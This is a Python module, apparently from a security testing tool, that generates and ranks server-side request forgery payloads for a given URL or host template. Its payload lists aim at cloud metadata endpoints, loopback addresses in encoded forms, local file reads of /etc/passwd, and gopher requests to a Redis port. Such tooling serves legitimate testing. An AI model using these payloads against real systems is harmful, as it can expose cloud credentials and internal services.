"""SSRF (server-side request forgery) payload mutation engine."""

from __future__ import annotations

from dataclasses import dataclass, field

from ..models import Context, Risk
from .context import analyze_ssrf_context

# Full-URL payloads: the input is fetched as-is (whole URL or a url= value).
_URL_BODIES = [
    ("http://169.254.169.254/latest/meta-data/", "metadata"),
    ("http://127.0.0.1/", "loopback"),
    ("http://[::1]/", "loopback-ipv6"),
    ("file:///etc/passwd", "file-read"),
    ("gopher://127.0.0.1:6379/_INFO", "gopher-smuggle"),
    ("http://2130706433/", "decimal-ip"),
    ("//169.254.169.254/", "protocol-relative"),
]

# Bare-authority payloads: the input lands in the host position.
_HOST_BODIES = [
    ("169.254.169.254", "metadata"),
    ("127.0.0.1", "loopback"),
    ("localhost", "localhost"),
    ("2130706433", "decimal-ip"),
    ("0x7f000001", "hex-ip"),
    ("expected.com@169.254.169.254", "userinfo-override"),
]

_RISK_ORDER = {
    Risk.CRITICAL: 4,
    Risk.HIGH: 3,
    Risk.MEDIUM: 2,
    Risk.LOW: 1,
    Risk.NONE: 0,
}


@dataclass
class SsrfCandidate:
    payload: str
    risk: Risk
    command_injected: bool
    syntax_valid: bool
    strategy: str


@dataclass
class SsrfMutationResult:
    template: str
    context: Context
    generated: int
    valid: int
    candidates: list[SsrfCandidate] = field(default_factory=list)

    @property
    def high_probability(self) -> list[str]:
        return [c.payload for c in self.candidates[:10]]

    def to_dict(self) -> dict:
        return {
            "template": self.template,
            "context": self.context.value,
            "generated": self.generated,
            "valid": self.valid,
            "high_probability": self.high_probability,
            "candidates": [
                {
                    "payload": c.payload,
                    "risk": c.risk.value,
                    "command_injected": c.command_injected,
                    "syntax_valid": c.syntax_valid,
                    "strategy": c.strategy,
                }
                for c in self.candidates
            ],
        }


def _bodies(context: Context):
    if context == Context.SSRF_HOST:
        return _HOST_BODIES
    return _URL_BODIES


def mutate_ssrf(template: str) -> SsrfMutationResult:
    """Generate and rank SSRF payloads for ``template``."""
    from .analyzer import analyze_ssrf

    context = analyze_ssrf_context(template)
    generated = _bodies(context)

    candidates: list[SsrfCandidate] = []
    for payload, strategy in generated:
        result = analyze_ssrf(template, payload)
        if result.breakout.command_injected:
            candidates.append(
                SsrfCandidate(
                    payload=payload,
                    risk=result.risk,
                    command_injected=True,
                    syntax_valid=result.balance.syntax_valid,
                    strategy=strategy,
                )
            )

    candidates.sort(
        key=lambda c: (_RISK_ORDER[c.risk], c.syntax_valid, -len(c.payload)),
        reverse=True,
    )

    return SsrfMutationResult(
        template=template,
        context=context,
        generated=len(generated),
        valid=len(candidates),
        candidates=candidates,
    )
